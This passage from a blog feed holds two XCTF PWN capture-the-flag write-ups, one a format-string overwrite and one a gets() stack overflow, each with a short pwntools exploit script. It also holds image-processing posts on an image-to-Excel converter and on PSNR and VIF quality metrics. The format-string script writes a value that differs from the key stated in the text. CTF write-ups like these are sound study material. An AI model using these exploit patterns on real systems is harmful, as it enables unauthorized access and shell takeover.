href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252244275.png" alt="image-20211025224443229"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-PWN-实时数据监测</title>
      <link href="/20211024_ctf_sssjjc/"/>
      <url>/20211024_ctf_sssjjc/</url>
      
        <content type="html"><![CDATA[<h1 id="XCTF-PWN-实时数据监测"><a href="#XCTF-PWN-实时数据监测" class="headerlink" title="XCTF-PWN-实时数据监测"></a>XCTF-PWN-实时数据监测</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>小A在对某家医药工厂进行扫描的时候，发现了一个大型实时数据库系统。小A意识到实时数据库系统会采集并存储与工业流程相关的上千节点的数据，只要登录进去，就能拿到有价值的数据。小A在尝试登陆实时数据库系统的过程中，一直找不到修改登录系统key的方法，虽然她现在收集到了能够登陆进系统的key的值，但是只能想别的办法来登陆。</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241534250.png" alt="image-20211024153412217"></p><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241542316.png" alt="image-20211024154220284"></p><p>发现只需要让key == 356795746，就能拿到shell</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241547473.png" alt="image-20211024154726432"></p><p>得到key的地址：0x0804A048</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241543281.png" alt="image-20211024154342252"></p><p>而<code>imagemagic</code>函数中有格式化字符串的漏洞</p><h3 id="测试偏移"><a href="#测试偏移" class="headerlink" title="测试偏移"></a>测试偏移</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241545591.png" alt="image-20211024154532553"></p><p>找到0x61616161的位置，得到偏移为12</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./sssjjc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">52134</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">key_addr = <span class="number">0x0804A048</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>, &#123;key_addr:<span class="number">35795746</span>&#125;)</span><br><span class="line"><span class="comment"># 用这个函数挺惭愧的，因为手算还是有些难度，理解了一题，换一题还是算不出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110241600223.png" alt="image-20211024160047163" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-PWN-反应釜开关控制</title>
      <link href="/20211023_ctf_fyfkgkz/"/>
      <url>/20211023_ctf_fyfkgkz/</url>
      
        <content type="html"><![CDATA[<h1 id="XCTF-PWN-反应釜开关控制"><a href="#XCTF-PWN-反应釜开关控制" class="headerlink" title="XCTF-PWN-反应釜开关控制"></a>XCTF-PWN-反应釜开关控制</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>小M在里一个私人矿厂中发现了一条TNT生产线中硝化反应釜的接口，反应釜是一种反应设备，非常的不稳定，会因为很多原因造成损坏，导致生产被迫停止。她怀疑这个工厂可能进行地下军火的制作，所以小M打算通过把反应釜关闭掉来干扰这条TNT生产线的运行，但是反应釜有多个闸门，得想办法帮她把闸门都关掉才行。</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@LAPTOP-V4AB5SPG:/mnt/d/me/CTF/xctf/fyfkgkz$ checksec ./fyfkgkz</span><br><span class="line">[*] &#x27;/mnt/d/me/CTF/xctf/fyfkgkz/fyfkgkz&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280831425.png" alt="image-20211023165913587"></p><p>发现<code>gets</code>函数可以溢出，并且可以找到<code>shell</code>函数，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280831887.png" alt="image-20211023170318793"></p><p>查看v5在栈中的情况：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280831137.png" alt="image-20211023170535752" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280831315.png" alt="image-20211023170602400" style="zoom:67%;" /><p>需要<code>0x200+0x8</code>长度数据覆盖</p><p>下面是<code>shell</code>函数的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280832838.png" alt="image-20211023170855845"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;fyfkgkz&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">64915</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x200</span> + <span class="number">0x8</span>) * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x4005F6</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280832485.png" alt="image-20211023171329798"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210929</title>
      <link href="/20210929-img-report/"/>
      <url>/20210929-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="去除毛刺的实验"><a href="#去除毛刺的实验" class="headerlink" title="去除毛刺的实验"></a>去除毛刺的实验</h2><p>样例图片：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040848988.png" alt="img"></p><h3 id="存在问题"><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h3><p>一番实验过后发现效果不行</p><h4 id="算法细节（补充）"><a href="#算法细节（补充）" class="headerlink" title="算法细节（补充）"></a>算法细节（补充）</h4><p>根据讨论纪要中的算法，制定了两项的测试方案：</p><ol><li>对全图取2X2的像素矩阵为一个单位，根据人为确定的阈值（如10与10附近的一些值），来确定划分边，结果发现被标记为一次划分的边不一定与毛刺有关联</li><li>为了提高实验效率，随机抽取多组肉眼可见的带有毛刺的局部样例，利用讨论纪要中的划分方式（将分割边连在一起，划分出两个部分，噪声被划分在哪一个部分就用该部分最接近与噪声值的像素值进行赋值）进行划分测试</li></ol><h3 id="分析原因"><a href="#分析原因" class="headerlink" title="分析原因"></a>分析原因</h3><p>利用脚本将图片绘制到execl表格</p><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"><span class="keyword">import</span> openpyxl.styles</span><br><span class="line"><span class="keyword">from</span> openpyxl.styles <span class="keyword">import</span> PatternFill</span><br><span class="line"><span class="keyword">from</span> openpyxl.utils <span class="keyword">import</span> get_column_letter</span><br><span class="line"><span class="keyword">from</span> progressbar <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RGB_to_Hex</span>(<span class="params">rgb</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    RGB颜色转换成16进制颜色</span></span><br><span class="line"><span class="string">    :param rgb:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    RGB = rgb.split(<span class="string">&#x27;,&#x27;</span>)            <span class="comment"># 将RGB格式划分开来</span></span><br><span class="line">    color = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> RGB:</span><br><span class="line">        num = <span class="built_in">int</span>(i)</span><br><span class="line">        <span class="comment"># 将R、G、B分别转化为16进制拼接转换并大写  hex() 函数用于将10进制整数转换成16进制，以字符串形式表示</span></span><br><span class="line">        color += <span class="built_in">str</span>(<span class="built_in">hex</span>(num))[-<span class="number">2</span>:].replace(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).upper()</span><br><span class="line">    <span class="keyword">return</span> color</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img2excel</span>(<span class="params">img_path,excelout_path</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    图片转换成excel</span></span><br><span class="line"><span class="string">    :param img_path: 图片地址</span></span><br><span class="line"><span class="string">    :param excelout_path: excel保存地址</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    img_src = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line">    <span class="comment">#宽高</span></span><br><span class="line">    img_width = img_src.size[<span class="number">0</span>]</span><br><span class="line">    img_height=img_src.size[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;图片宽%s,高%s&quot;</span>%(img_width,img_height))</span><br><span class="line">    <span class="comment"># 类型</span></span><br><span class="line">    <span class="comment"># print(img_src.mode)</span></span><br><span class="line">    <span class="keyword">if</span> img_src.mode != <span class="string">&quot;RGB&quot;</span>:</span><br><span class="line">        img_src = img_src.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    str_strlist = img_src.load()</span><br><span class="line">    wb=openpyxl.Workbook()</span><br><span class="line">    wb.save(excelout_path)</span><br><span class="line">    wb=openpyxl.load_workbook(excelout_path)</span><br><span class="line">    sheet=wb[<span class="string">&quot;Sheet&quot;</span>]</span><br><span class="line">    sheet.title=<span class="string">&quot;img2excel&quot;</span></span><br><span class="line">    cell_width = <span class="number">1.0</span></span><br><span class="line">    cell_height = cell_width * (<span class="number">2.2862</span> / <span class="number">0.3612</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在疯狂生成excel,请耐心等待...&quot;</span>)</span><br><span class="line">    <span class="comment">#进度条</span></span><br><span class="line">    widgets=[<span class="string">&#x27;进度:&#x27;</span>,Percentage(),<span class="string">&#x27;&#x27;</span>,Bar(<span class="string">&#x27;#&#x27;</span>),<span class="string">&#x27;&#x27;</span>,Timer(),<span class="string">&#x27; &#x27;</span>, ETA(), <span class="string">&#x27; &#x27;</span>]</span><br><span class="line">    pb=ProgressBar(widgets=widgets)</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> pb(<span class="built_in">range</span>(img_width)):</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(img_height):</span><br><span class="line">            data = str_strlist[w,h]</span><br><span class="line">            <span class="comment"># 把元组rgb颜色变成字符串，转换成16进制颜色(1,2,3)--&gt;&#x27;1,2,3&#x27;</span></span><br><span class="line">            color=<span class="built_in">str</span>(data).replace(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="comment">#16进制的颜色,不带前面#号的，要#自己拼接到color前面即可</span></span><br><span class="line">            color=RGB_to_Hex(color)</span><br><span class="line">            <span class="comment"># 设置填充颜色为color,solid参数表示填充实色</span></span><br><span class="line">            fille=PatternFill(<span class="string">&quot;solid&quot;</span>,fgColor=color)</span><br><span class="line">            sheet.cell(h+<span class="number">1</span>,w+<span class="number">1</span>).fill=fille</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成完成,正在设置单元格格式...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheet.max_row+<span class="number">1</span>):</span><br><span class="line">        sheet.row_dimensions[i].height=cell_height</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheet.max_column+<span class="number">1</span>):</span><br><span class="line">        sheet.column_dimensions[get_column_letter(i)].width = cell_width</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;格式设置完成,正在保存excel...&#x27;</span>)</span><br><span class="line">    wb.save(excelout_path)</span><br><span class="line">    img_src.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;保存excel成功！请打开[%s]查看&quot;</span>%excelout_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys,os</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入图片地址和excel保存的地址\n&quot;</span></span><br><span class="line">              <span class="string">&quot;例如命令行输入 python img2excel_user.py  D:/result.png  D:/outExcel.xlsx&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        img_virify=[<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;.gif&#x27;</span>,<span class="string">&#x27;.bmp&#x27;</span>,<span class="string">&#x27;.jpeg&#x27;</span>,<span class="string">&#x27;.jpe&#x27;</span>,<span class="string">&#x27;.jfif&#x27;</span>]</span><br><span class="line">        excel_virify=[<span class="string">&#x27;.xlsx&#x27;</span>,<span class="string">&#x27;.xlsm&#x27;</span>,<span class="string">&#x27;.xltx&#x27;</span>,<span class="string">&#x27;.xltm&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 图片地址</span></span><br><span class="line">        img_path=sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># excel保存地址</span></span><br><span class="line">        excelout_path=sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        endName=os.path.splitext(img_path)</span><br><span class="line">        <span class="keyword">if</span> endName[<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> img_virify:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请选择支持的图片类型&quot;</span>,img_virify)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        endName_excel=os.path.splitext(excelout_path)</span><br><span class="line">        <span class="keyword">if</span>  endName_excel[<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> excel_virify:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;excel 格式不支持，请选择支持的格式&quot;</span>,excel_virify)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        img2excel(<span class="string">r&quot;&quot;</span>+img_path+<span class="string">&quot;&quot;</span>,excelout_path)</span><br></pre></td></tr></table></figure><h4 id="局部样例"><a href="#局部样例" class="headerlink" title="局部样例"></a>局部样例</h4><p>举例：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040850554.png" alt="1"></p><p>方框选中区域为明显的毛刺区域，这也是比较典型的毛刺种类之一</p><h4 id="B通道数据示例"><a href="#B通道数据示例" class="headerlink" title="B通道数据示例"></a>B通道数据示例</h4><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040850684.png" alt="2"></p><p>对于数据的划分如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040850058.jpg" alt="3"></p><p>很明显经过分割以后，这样的状态仍然不能解决毛刺问题，反而还会让毛刺问题更加严重</p><p>而在讨论纪要中提到的求最短路划分的方法不能满足所有情况，理由如下：</p><ul><li><p>如下图是不能用划分来去除毛刺的，被改变的划分不一定是合理的</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040850341.png" alt="4"></p></li><li><p>有的会被判断为毛刺的地方可能就是图片本身所需要的（原图就应该是如此），如下图蓝色部分应该是越“尖”越好</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040850690.png" alt="5"></p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python实现IQA图像质量评价</title>
      <link href="/20210815-img-report/"/>
      <url>/20210815-img-report/</url>
      
        <content type="html"><![CDATA[<p>全称：Image Quality Assessment</p><p>百度百科 IQA：<a href="https://baike.baidu.com/item/IQA/19453034?fr=aladdin">https://baike.baidu.com/item/IQA/19453034?fr=aladdin</a></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040845503.png" alt="img"></p><h3 id="主观评价"><a href="#主观评价" class="headerlink" title="主观评价"></a>主观评价</h3><p>主观评价方法主要可分为两种：绝对评价和相对评价。</p><p>但是实现起来都有困难，这里先不考虑。</p><h3 id="客观评价"><a href="#客观评价" class="headerlink" title="客观评价"></a>客观评价</h3><h4 id="全参考"><a href="#全参考" class="headerlink" title="全参考"></a>全参考</h4><h5 id="基于图像像素统计基础"><a href="#基于图像像素统计基础" class="headerlink" title="基于图像像素统计基础"></a>基于图像像素统计基础</h5><ul><li>峰值信噪比（PSNR）：PSNR值越大，表明待评图像与参考图像之间的失真较小，图像质量较好</li><li>均方误差（MSE）：MSE的值越小，表明图像质量越好</li></ul><h6 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import cv2 as cv</span><br><span class="line">import numpy as np</span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 均方误差（MSE）：MSE的值越小，表明图像质量越好</span><br><span class="line">def get_mse(img1, img2):</span><br><span class="line">    return np.mean((img1 / 255. - img2 / 255.) ** 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 峰值信噪比（PSNR）：PSNR值越大，表明待评图像与参考图像之间的失真较小，图像质量较好</span><br><span class="line"># 基准为30dB，小于30为劣质</span><br><span class="line">def get_psnr(img1, img2):</span><br><span class="line">    mse = get_mse(img1, img2)</span><br><span class="line">    if mse &lt; 1.0e-10:</span><br><span class="line">        return 100</span><br><span class="line">    pixel_max = 1</span><br><span class="line">    return 20 * math.log10(pixel_max / math.sqrt(mse))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    origin_img = cv.imread(&#x27;img.png&#x27;, 1)</span><br><span class="line">    new_img = cv.imread(&#x27;denoised_img_noise.png&#x27;, 1)</span><br><span class="line">    print(&#x27;MSE:&#x27;, get_mse(origin_img, new_img))</span><br><span class="line">    print(&#x27;PSNR:&#x27;, get_psnr(origin_img, new_img))</span><br></pre></td></tr></table></figure><h6 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h6><blockquote><p>MSE: 0.0004777804926332579 </p><p>PSNR: 33.20771586094474</p></blockquote><p>从结果可以看出，上面测试使用的降噪后的图片质量还是可以的</p><h5 id="基于信息论基础"><a href="#基于信息论基础" class="headerlink" title="基于信息论基础"></a>基于信息论基础</h5><blockquote><p>基于信息论中信息熵基础，互信息被广泛用来评价图像质量。近些年，Sheikh和Bovik等人提出来了信息保真度准则（Information Fidelity Criterion,IFC）和视觉信息保真度（Visual Information Fidelity,VIF）两种算法。它们通过计算待评图像与参考图像之间的互信息来衡量待评图像的质量优劣。这两种方法具有一定的理论支撑，在信息保真度上拓展了图像与人眼之间的联系，但是这类方法对于图像的结构信息没有反应。</p></blockquote><p>关于信息保真度准则（Information Fidelity Criterion,IFC）和视觉信息保真度（Visual Information Fidelity,VIF）这两种算法网上很难搜到合适的资料，即便能找到个别也都是matlab的，IFC方法到现在还没办法实现，下面是VIF方法。</p><h6 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import numpy</span><br><span class="line">import scipy.signal</span><br><span class="line">import scipy.ndimage</span><br><span class="line"></span><br><span class="line">__all__ = [&#x27;compare_vifp&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def compare_vifp(ref, dist):</span><br><span class="line">    sigma_nsq = 2</span><br><span class="line">    eps = 1e-10</span><br><span class="line"></span><br><span class="line">    num = 0.0</span><br><span class="line">    den = 0.0</span><br><span class="line">    for scale in range(1, 5):</span><br><span class="line"></span><br><span class="line">        N = 2 ** (4 - scale + 1) + 1</span><br><span class="line">        sd = N / 5.0</span><br><span class="line"></span><br><span class="line">        if scale &gt; 1:</span><br><span class="line">            ref = scipy.ndimage.gaussian_filter(ref, sd)</span><br><span class="line">            dist = scipy.ndimage.gaussian_filter(dist, sd)</span><br><span class="line">            ref = ref[::2, ::2]</span><br><span class="line">            dist = dist[::2, ::2]</span><br><span class="line"></span><br><span class="line">        mu1 = scipy.ndimage.gaussian_filter(ref, sd)</span><br><span class="line">        mu2 = scipy.ndimage.gaussian_filter(dist, sd)</span><br><span class="line">        mu1_sq = mu1 * mu1</span><br><span class="line">        mu2_sq = mu2 * mu2</span><br><span class="line">        mu1_mu2 = mu1 * mu2</span><br><span class="line">        sigma1_sq = scipy.ndimage.gaussian_filter(ref * ref, sd) - mu1_sq</span><br><span class="line">        sigma2_sq = scipy.ndimage.gaussian_filter(dist * dist, sd) - mu2_sq</span><br><span class="line">        sigma12 = scipy.ndimage.gaussian_filter(ref * dist, sd) - mu1_mu2</span><br><span class="line"></span><br><span class="line">        sigma1_sq[sigma1_sq &lt; 0] = 0</span><br><span class="line">        sigma2_sq[sigma2_sq &lt; 0] = 0</span><br><span class="line"></span><br><span class="line">        g = sigma12 / (sigma1_sq + eps)</span><br><span class="line">        sv_sq = sigma2_sq - g * sigma12</span><br><span class="line"></span><br><span class="line">        g[sigma1_sq &lt; eps] = 0</span><br><span class="line">        sv_sq[sigma1_sq &lt; eps] = sigma2_sq[sigma1_sq &lt; eps]</span><br><span class="line">        sigma1_sq[sigma1_sq &lt; eps] = 0</span><br><span class="line"></span><br><span class="line">        g[sigma2_sq &lt; eps] = 0</span><br><span class="line">        sv_sq[sigma2_sq &lt; eps] = 0</span><br><span class="line"></span><br><span class="line">        sv_sq[g &lt; 0] = sigma2_sq[g &lt; 0]</span><br><span class="line">        g[g &lt; 0] = 0</span><br><span class="line">        sv_sq[sv_sq &lt;= eps] = eps</span><br><span class="line"></span><br><span class="line">        num += numpy.sum(numpy.log10(1 + g * g * sigma1_sq / (sv_sq + sigma_nsq)))</span><br><span class="line">        den += numpy.sum(numpy.log10(1 + sigma1_sq / sigma_nsq))</span><br><span class="line"></span><br><span class="line">    vifp = num / den</span><br><span class="line"></span><br><span class="line">    if numpy.isnan(vifp):</span><br><span class="line">        return 1.0</span><br><span class="line">    else:</span><br><span class="line">        return 